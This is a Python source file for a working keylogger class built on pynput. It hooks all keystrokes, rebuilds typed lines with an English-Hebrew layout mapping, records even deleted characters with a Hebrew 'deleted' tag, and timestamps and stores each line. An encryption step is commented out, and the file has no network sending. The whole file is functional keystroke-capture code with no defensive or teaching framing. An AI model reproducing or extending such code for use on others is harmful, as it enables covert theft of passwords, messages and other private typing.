from pynput import keyboard
from datetime import datetime
from encryptor import Encryptor
import platform

EN_TO_HEB = {
    'a': 'ש', 'b': 'נ', 'c': 'ב', 'd': 'ג', 'e': 'ק',
    'f': 'כ', 'g': 'ע', 'h': 'י', 'i': 'ן', 'j': 'ח',
    'k': 'ל', 'l': 'ך', 'm': 'צ', 'n': 'מ', 'o': 'ם',
    'p': 'פ', 'q': '/', 'r': 'ר', 's': 'ד', 't': 'א',
    'u': 'ו', 'v': 'ה', 'w': "'", 'x': 'ס', 'y': 'ט',
    'z': 'ז',

    'ש': 'a', 'נ': 'b', 'ב': 'c', 'ג': 'd', 'ק': 'e',
    'כ': 'f', 'ע': 'g', 'י': 'h', 'ן': 'i', 'ח': 'j',
    'ל': 'k', 'ך': 'l', 'צ': 'm', 'מ': 'n', 'ם': 'o',
    'פ': 'p', '/': 'q', 'ר': 'r', 'ד': 's', 'א': 't',
    'ו': 'u', 'ה': 'v', "'": 'w', 'ס': 'x', 'ט': 'y',
    'ז': 'z',
}

class KeyloggerService:
    def __init__(self, encryptor: Encryptor):
        self.flag = False
        self.current_line = ""
        self.current_word = ""
        self.logged_lines = []
        self.listener = None
        self.backspace_count = 0
        self.backspace_active = False
        self.pressed_keys = set()
        self.system = platform.system()
        self.encryptor = encryptor

    def start_logging(self):
        if self.listener and self.listener.running:
            return
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()

    def stop_logging(self):
        if self.listener and self.listener.running:
            self.listener.stop()
        if self.backspace_active:
            self._apply_backspace()
        if self.current_word:
            self.current_line += self.current_word
            self.current_word = ""
        if self.current_line.strip():
            self._log_current_line()
            self.current_line = ""

    def _on_press(self, key):
        self.pressed_keys.add(key)
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.backspace:
                char = "<backspace>"
            else:
                char = None

        if char == "<backspace>":
            self.backspace_count += 1
            self.backspace_active = True
        else:
            if self.backspace_active:
                self._apply_backspace()
            self.backspace_active = False
            self.backspace_count = 0
            if char is not None:
                self._handle_char(char)

    def _on_release(self, key):
        if key in self.pressed_keys:
            self.pressed_keys.remove(key)

    def _handle_char(self, char):
        if char == " ":
            self.current_line += self.current_word + " "
            self.current_word = ""
        elif char == "\n":
            if self.current_word:
                self.current_line += self.current_word
                self.current_word = ""
            if self.current_line.strip():
                self._log_current_line()
            self.current_line = ""
        else:
            if self.flag:
                self.current_word += EN_TO_HEB.get(char, char)
            else:
                self.current_word += char

    def _apply_backspace(self):
        count = self.backspace_count
        removed = ""
        for _ in range(count):
            if self.current_word:
                removed += self.current_word[-1]
                self.current_word = self.current_word[:-1]
            elif self.current_line:
                removed += self.current_line[-1]
                self.current_line = self.current_line[:-1]
        if removed:
            removed = removed[::-1]
            self.current_line = self.current_line.rstrip()
            self.current_line += f" (נמחק: {removed}) "
        self.backspace_count = 0

    def _log_current_line(self):
        timestamp = datetime.now().strftime("%H:%M")
        log_line = f"{timestamp} | {self.current_line.strip()}"
        # encrypted_log = self.encryptor.encrypt(log_line)
        self.logged_lines.append(log_line)

    def get_logged_lines(self):
        return self.logged_lines
